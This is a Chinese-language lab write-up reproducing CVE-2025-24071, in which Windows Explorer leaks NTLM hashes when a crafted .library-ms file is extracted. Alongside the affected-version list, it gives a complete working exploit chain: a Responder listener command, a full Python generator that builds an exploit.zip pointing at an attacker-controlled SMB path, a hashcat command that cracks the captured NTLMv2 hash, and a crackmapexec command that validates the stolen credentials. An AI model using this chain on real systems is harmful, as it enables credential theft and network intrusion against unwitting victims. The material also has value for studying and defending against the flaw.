***\*漏洞概述：\****

***\*Windows 文件资源管理器作为 Windows 操作系统的核心组件，负责管理和浏览本地及网络上的文件和文件夹。\****

***\*当攻击者构造一个包含恶意 SMB 路径的 `.library-ms` 文件并诱导受害者解压时，Windows 文件资源管理器会自动解析该文件内容以生成预览和索引元数据。在此过程中，系统会尝试解析嵌入的SMB路径（例如:`\\192.168.x.x\shared`），从而触发与攻击者控制的服务器之间的 NTLM 认证握手。这一行为会在无需用户交互的情况下，导致受害者的 NTLMv2 哈希被泄露，进而可能被攻击者用于进一步的攻击。\****

***\**\*受影响版本:\*\**\***

Windows 10:

- Version 1809 for both x64 and 32-bit systems
- Version 1607 for x64 and 32-bit
- Version 22H2 (x64, 32-bit, ARM64)
- Version 21H2 for x64, ARM64, and 32-bit



• Windows 11:

- Version 24H2 for x64 and ARM64 systems
- Version 23H2 for x64 and ARM64 systems
- Version 22H2 for x64 and ARM64 systems



• Windows Server:

- Windows Server 2025 (Server Core installation and full versions)
- Windows Server 2022 (Server Core installation and full versions)
- Windows Server 2019 and Windows Server 2016 (Server Core installations)
- Windows Server 2012 R2 (Server Core installation and full version)

***\**\*漏洞复现：\*\**\***

***\**\*首先监听机器使用kali机器，利用该机器开启一个监听，用来配合该漏洞对目标机器的NTLM进行捕获\*\**\***

- 

```
sudo responder -I eth0 -v 
```

![图片](CVE-2025-24071-windows%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E.assets/640.png)

***\**\*而后使用github已经公开的脚本，ip地址填写kali地址，文件名随便写就行，这个脚本的目的是为了生成包含\*\*\*\*\*\*.library-ms\*\* 文件的压缩包\*\*\*\*\*\**\***

![图片](CVE-2025-24071-windows%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E.assets/640-1742873465934-1.png)

***\**\*\*\*\*\*脚本内容如下：\*\*\*\*\*\**\***

```
import os
import zipfile

def main():
    file_name = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")


    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""

    library_file_name = f"{file_name}.library-ms"
    with open(library_file_name, "w", encoding="utf-8") as f:
        f.write(library_content)


    with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)


    if os.path.exists(library_file_name):
        os.remove(library_file_name)

    print("completed")

if __name__ == "__main__":
    main()
```

***\**\*\*\*\*\*执行成功后，将压缩包拷贝到目标机器，此处演示的机器为windows10机器，然后直接解压。(使用7z和自带的没有区别)\*\*\*\*\*\**\***

![图片](CVE-2025-24071-windows%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E.assets/640-1742873465935-2.png)

![图片](CVE-2025-24071-windows%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E.assets/640-1742873465935-3.png)

***\**\*\*\*\*\*解压成功后，发现kali机器成功监听到ntlm的握手信息\*\*\*\*\*\**\***

![图片](CVE-2025-24071-windows%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E.assets/640-1742873465935-4.png)

***\**\*\*\*\*\*将监听到的hash保存到文件里，然后利用hashcat进行密码破解\*\*\*\*\*\**\***

- 

```
hashcat hash.txt top19576.txt -m 5600
```

![图片](CVE-2025-24071-windows%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E.assets/640-1742873465935-5.png)

***\**\*\*\*\*\*最后利用工具进行验证，发现密码正确\*\*\*\*\*\**\***

- 

```
crackmapexec smb 192.168.50.105 -u "vlan" -p "123456"
```

![图片](CVE-2025-24071-windows%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E.assets/640-1742873465935-6.png)

***\**\*\*\*\*\*本次实验是在虚拟机里进行的，在测试的时候，曾经在局域网内发送了两个样本到其他物理机，解压后并没有成功的返回ntlm值，不知道是为什么\*\*\*\*\*\**\***